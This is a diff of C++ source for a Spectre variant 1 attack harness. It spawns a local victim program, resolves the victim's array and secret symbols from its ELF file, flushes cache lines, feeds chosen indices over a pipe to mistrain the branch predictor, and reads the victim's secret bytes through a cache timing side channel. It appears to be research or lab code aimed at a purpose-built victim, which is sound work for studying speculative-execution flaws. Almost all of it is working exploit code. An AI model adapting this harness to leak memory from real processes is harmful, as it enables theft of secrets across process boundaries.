@@ -4,81 +4,46 @@
 #include <stdafx.h>
 #include <cacheutils.h>
 #include <Spectrev1.h>
+#include <DuplexPipe.h>
 #include <lilelf.h>
-#include <unistd.h>
-
-//int main()
-//{
-//    // Create the victim process
-//    FILE *victim_fp = popen("./Spec1Victim", "w");
-//
-//    auto victim = LilElf("./Spec1Victim");
-//
-//    // Look for symbols in victim
-//    auto sym_secret = victim.get_sym("secret");
-//    auto sym_array1_size = victim.get_sym("array1_size");
-//    auto sym_array2 =victim.get_sym("array2");
-//    auto sym_array1 = victim.get_sym("array1");
-//
-//    auto m_array1_size = victim.get_sym_value<void*>(sym_array1_size);
-//    auto m_secret = victim.get_sym_value<uint8_t>(sym_secret);
-//
-//    Spectrev1 s(victim.get_sym_value<void*>(sym_array1),
-//                victim.get_sym_value<void*>(sym_array2),
-//                [&](volatile size_t _x){flush(m_array1_size); fprintf(victim_fp, "%llu\n", _x); },
-//                [](size_t _t){return _t%16;},
-//                512,
-//                MAX_TRIES,
-//                30
-//    );
-//    sleep(1);
-//
-//    uint8_t val;
-//    for (size_t i = 0; i < sym_secret->st_size; ++i)
-//    {
-//        s.read_byte(&m_secret[i], &val);
-//        printf("0x%02X = %c\n", val, val);
-//    }
-//
-//    pclose(victim_fp);
-//}
 
 #define _SECRET_LEN 25
-#define _BLOCK_LEN 512
+#define _BLOCK_LEN 1024
 #define _MAX_TRIES 1000
+
+#define VICTIM_BIN "./Spec1Victim"
 
 int main()
 {
-    FILE *victim_fp = popen("./Spec1Victim", "w");
-    sleep(1);
-    auto victim = LilElf("./Spec1Victim");
+    auto du_pipes = DuplexPipe(VICTIM_BIN, NULL);
+    auto victim = LilElf(VICTIM_BIN);
+    auto m_array1_size = victim.get_sym_value<void>(victim.get_sym("_ZL11array1_size"));
+    auto m_array1 = victim.get_sym_value<void>(victim.get_sym("_ZL6array1"));
+    auto m_array2 = victim.get_sym_value<void>(victim.get_sym("_ZL6array2"));
 
-    // Look for symbols in victim
     auto sym_secret = victim.get_sym("secret");
-    auto sym_array1_size = victim.get_sym("array1_size");
-    auto sym_array2 = victim.get_sym("array2");
-    auto sym_array1 = victim.get_sym("array1");
-
-    auto m_array1_size = victim.get_sym_value<void*>(sym_array1_size);
     auto m_secret = victim.get_sym_value<uint8_t>(sym_secret);
 
-    Spectrev1 s(victim.get_sym_value<void*>(sym_array1),
-                victim.get_sym_value<void*>(sym_array2),
-                [&](volatile size_t _x){flush(m_array1_size); fprintf(victim_fp, "%llu\n", _x); fflush(victim_fp);},
-                [](size_t _t){return 15;},
+    Spectrev1 s(m_array1,
+                m_array2,
+                [&](volatile size_t _x){ du_pipes.clear_rx(); flush(m_array1_size); du_pipes.fmt_send("%llu\n", _x); },
+                [](size_t _t){return _t%16;},
                 _BLOCK_LEN,
                 _MAX_TRIES/4,
                 13
     );
 
-
     uint8_t val;
+    du_pipes.receive_str();
+    du_pipes.print_rx_buf();
+
+    du_pipes.fmt_send("%llu\n", 1);
     for (size_t i = 0; i < 25; ++i)
     {
+//        load(&m_secret[i]);
         s.read_byte(&m_secret[i], &val);
-//        printf("%02x ", val);
+//        printf("%x ", m_secret[i]);
     }
 //    printf("\n");
-    pclose(victim_fp);
 }
 
